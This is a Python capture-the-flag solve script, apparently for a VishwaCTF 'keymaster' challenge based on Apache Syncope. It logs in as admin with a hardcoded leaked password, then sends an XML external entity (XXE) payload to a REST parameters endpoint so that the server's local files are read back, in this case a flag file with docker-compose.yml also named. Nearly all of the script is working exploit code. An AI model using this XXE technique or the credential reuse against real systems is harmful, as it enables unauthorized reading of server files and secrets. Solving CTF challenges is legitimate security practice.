import requests
import json

url = "https://keymaster.vishwactf.com"
s = requests.Session()

# leak creds in /maintenance
res = s.post(f'{url}/login', data={
    'username': 'admin',
    'password': 'S3cur3Syncop3!@dm1n'
})

if "dashboard" in res.text.lower():
    print("> Logged in")

# syncope keymaster xxe
file = '/app/docker-compose.yml'
file = '/opt/syncope/runtime/.flag'

payload = f'''
<?xml version="1.0"?>
<!DOCTYPE value [
  <!ENTITY xxe PUBLIC "a" "file://{file}">
]>
<parameter>
  <key>1337</key>
  <value>&xxe;</value>
  <type>STRING</type>
</parameter>
'''.strip()

res = s.post(f'{url}/rest/keymaster/params', data={
    'param_xml': payload.strip()
})

data = json.loads(res.text)
leak = data['parameter']['value']

print("Flag:", leak)